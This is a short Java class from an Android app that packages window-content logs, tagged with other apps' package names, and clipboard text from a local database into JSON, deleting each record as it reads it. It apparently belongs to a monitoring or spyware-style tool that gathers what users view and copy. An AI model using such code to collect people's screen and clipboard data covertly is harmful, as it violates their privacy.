package com.hhm.android.otherapp.managers;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.hhm.android.otherapp.sqlite.ClipObject;
import com.hhm.android.otherapp.sqlite.LogObjects;
import com.hhm.android.otherapp.sqlite.SQLiteDao;

import java.util.ArrayList;

/**
 * @author huangche
 * @date 2020/11/12
 * 数据库数据获取
 *  clip 剪切板数据
 *  log  浏览器数据
 */
public class SQLiteManager {
    public static final String TAG = "SQLiteManager";

    // 获取浏览记录 log 列表，并序列化为 JSON 格式
    public static JsonArray getLogList(){
        try{
            JsonArray list = new JsonArray();
            ArrayList<LogObjects> ObjectList = SQLiteDao.searchAndDeleteLogOfDb();
            for (LogObjects object:ObjectList){
                JsonObject logObject = new JsonObject();
                logObject.addProperty("log_id", object._id);
                logObject.addProperty("log_date" , object.timeStamp);
                logObject.addProperty("log_pakName",object.packageName);
                logObject.addProperty("log_content" , object.windowContent);
                list.add(logObject);
            }
            return list;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    // 获取剪贴板内容 clip 列表，并序列化为 JSON 格式
    public static JsonArray getClipList(){
        try{
            JsonArray list = new JsonArray();
            ArrayList<ClipObject> objectList = SQLiteDao.searchAndDeleteClipOfDb();
            for (ClipObject object : objectList){
                JsonObject logObject = new JsonObject();
                logObject.addProperty("clip_id", object._id);
                logObject.addProperty("clip_date" , object.timeStamp);
                logObject.addProperty("clip_msg" , object.clipBoardText);
                list.add(logObject);
            }
            return list;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
